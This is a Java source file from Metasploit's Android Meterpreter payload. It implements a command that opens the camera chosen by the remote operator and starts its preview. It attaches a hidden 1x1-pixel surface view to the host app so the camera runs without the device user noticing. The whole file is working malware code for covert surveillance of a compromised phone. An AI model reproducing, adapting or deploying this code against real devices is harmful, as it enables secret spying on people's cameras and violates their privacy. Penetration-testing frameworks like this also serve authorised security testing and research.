
package com.metasploit.meterpreter.android;

import android.app.Activity;
import android.content.Context;
import android.hardware.Camera;
import android.os.Handler;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import java.io.IOException;
import java.lang.Override;
import java.lang.reflect.Method;

public class webcam_start_android extends webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_INTERFACE_ID = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 2);

    public static Camera camera;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int camId = request.getIntValue(TLV_TYPE_WEBCAM_INTERFACE_ID);

        try {
            Class<?> cameraClass = Class.forName("android.hardware.Camera");
            Method cameraOpenMethod = cameraClass.getMethod("open", Integer.TYPE);
            if (cameraOpenMethod != null) {
                camera = (Camera) cameraOpenMethod.invoke(null, camId - 1);
            } else {
                camera = Camera.open();
            }

            AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
            final Context context = androidMeterpreter.getContext();
            Handler handler = new Handler(context.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    SurfaceView surfaceView = new SurfaceView(context);
                    SurfaceHolder surfaceHolder = surfaceView.getHolder();
                    surfaceHolder.addCallback(new SurfaceHolder.Callback() {
                        @Override
                        public void surfaceCreated(SurfaceHolder holder) {
                            try {
                                camera.setPreviewDisplay(holder);
                            } catch (IOException e) {
                            }
                        }

                        @Override
                        public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
                            if (camera == null) {
                                return;
                            }
                            camera.startPreview();
                            synchronized (webcam_start_android.this) {
                                webcam_start_android.this.notify();
                            }
                        }

                        @Override
                        public void surfaceDestroyed(SurfaceHolder holder) {

                        }
                    });
                    surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
                    Activity activity = (Activity)context;
                    ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(1, 1);
                    activity.addContentView(surfaceView, layoutParams);
                }
            });

            synchronized (this) {
                wait(4000);
            }

        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
